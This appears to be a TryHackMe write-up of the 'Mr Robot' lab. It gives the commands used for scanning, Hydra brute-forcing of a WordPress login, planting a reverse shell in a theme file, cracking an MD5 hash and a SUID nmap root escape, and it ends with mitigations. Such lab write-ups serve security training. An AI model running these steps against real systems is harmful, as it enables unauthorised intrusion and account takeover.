---
layout: post
title: Mr Robot CTF
subtitle: TryHackMe Writeup - Mr Robot CTF
description: Enumerate services, scan TCP/UDP ports, exploit WordPress vulnerabilities, and escalate privileges to capture flags in this Mr. Robot-themed CTF.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg
category: tryhackme
tags:
  - TryHackMe
  - WordPress
  - CTF
  - Privilege Escalation
  - Nmap
  - SUID
author: mustafa_altayeb
date: 2025-10-10 00:00:00 +0000
paginate: true
---

# Mr Robot CTF - TryHackMe Writeup

[Mr Robot CTF](https://tryhackme.com/room/mrrobot) is a beginner-friendly CTF room inspired by the Mr. Robot TV series. This room focuses on web enumeration, WordPress exploitation, and Linux privilege escalation.

**Difficulty**: Easy ⭐  
**Operating System**: Linux (Ubuntu)  
**Themes**: Web Enumeration, WordPress, Password Cracking, SUID Privilege Escalation

---

## Objectives

1. Enumerate web services and discover hidden files
2. Exploit WordPress authentication vulnerabilities
3. Gain initial shell access
4. Escalate privileges to root
5. Capture all three flags

---

## Reconnaissance

### Nmap Scan

Started with a comprehensive port scan:

```bash
nmap -p- -sCV -oA MrRobot-Nmap 10.10.186.36
```

**Results**:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
```

**Key Findings**:
- **Port 22**: SSH service
- **Ports 80/443**: Web servers running Apache

---

## Web Enumeration

### Directory Discovery with Gobuster

```bash
gobuster dir --url http://10.10.74.251 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Important Discoveries**:
- `/robots` - Contains flag hints and wordlist
- `/wp-login` - WordPress login page
- `/readme` - System information
- `/license` - Licensing information
- `/phpmyadmin` - Database administration (403 Forbidden)

### Flag 1 Discovery

Accessed `/robots.txt`:

![Robots.txt Content](/assets/TryHackMeRoomsImage/MrRobot/image.png)

**Contents**:
```
User-agent: *
Disallow: /wp-admin/
Disallow: /wp-login/
Disallow: /readme.html
Disallow: /license.txt
Disallow: /key-1-of-3.txt
```

**Flag 1 Captured**:  
Accessed `/key-1-of-3.txt` to obtain the first flag.

**Additional Discovery**:  
Found `fsocity.dic` - A wordlist file that would be useful for brute-force attacks.

### WordPress Discovery

Found WordPress login page at `/wp-login.php`:

![WordPress Login](/assets/TryHackMeRoomsImage/MrRobot/image1.png)

---

## Initial Access

### Username Enumeration

Used Hydra to enumerate valid usernames:

```bash
hydra -L fsocity.dic -p test 10.10.186.36 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```

**Result**: Found username `Elliot`

### Password Brute-Force

```bash
hydra -l Elliot -P fsocity.dic 10.10.186.36 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
```

**Credentials Found**:
- Username: `Elliot`
- Password: `ER28-0652`

### WordPress Admin Access

Logged into WordPress dashboard with discovered credentials.

### Reverse Shell Deployment

1. **Navigate to Theme Editor**:
   - Appearance → Editor → 404.php

2. **Insert PHP Reverse Shell**:
   Used [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

   ![Theme Editor](/assets/TryHackMeRoomsImage/MrRobot/image2.png)

3. **Start Listener**:
   ```bash
   nc -nlvp 9999
   ```

4. **Trigger Shell**:
   Accessed a non-existent page to trigger the 404 template

### Shell Obtained

```bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

---

## Lateral Movement

### User Enumeration

```bash
ls /home
# Output: robot
```

### Credential Discovery

Found in `/home/robot`:
```bash
cd /home/robot
ls
# Output: key-2-of-3.txt  password.raw-md5
```

**MD5 Hash Content**:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Password Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
```

**Password Found**: `abcdefghijklmnopqrstuvwxyz`

### User Switch

```bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

### Flag 2 Capture

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cat key-2-of-3.txt
```

**Flag 2 Captured**

---

## Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Notable Finding**:
```
/usr/local/bin/nmap
```

### Nmap SUID Exploitation

Referenced [GTFOBins Nmap](https://gtfobins.github.io/gtfobins/nmap/):

![GTFOBins Reference](/assets/TryHackMeRoomsImage/MrRobot/image3.png)

**Exploitation**:
```bash
nmap --interactive
nmap> !sh
whoami
# Output: root
```

### Flag 3 Capture

```bash
cat /root/key-3-of-3.txt
```

**Flag 3 Captured**

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Web Enumeration → Robots.txt Discovery → 
WordPress Login → Hydra Brute-Force → WordPress Admin Access → 
Theme Editor Exploit → Reverse Shell → Credential Discovery → 
Password Cracking → User Switch → SUID Enumeration → 
Nmap Exploitation → Root Access
```

### Vulnerabilities Exploited:
1. **Information Disclosure** - Sensitive files in robots.txt
2. **Weak Password Policy** - Crackable MD5 hash
3. **WordPress Misconfiguration** - Theme editor access
4. **SUID Misconfiguration** - Nmap with SUID permissions

### Mitigation Strategies:
1. **For WordPress Security**:
   - Disable theme/plugin editor
   - Implement strong password policies
   - Limit login attempts
   - Regular security updates

2. **For Linux Security**:
   - Regular SUID binary audits
   - Principle of least privilege
   - Secure credential storage
   - Regular system updates

3. **For Web Security**:
   - Restrict sensitive file access
   - Implement proper robots.txt
   - Regular security assessments
   - Input validation and sanitization

### Tools Used:
- **Nmap** - Port scanning
- **Gobuster** - Directory enumeration
- **Hydra** - Password brute-forcing
- **JohnTheRipper** - Password cracking
- **GTFOBins** - Privilege escalation reference
- **Netcat** - Reverse shell handling

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
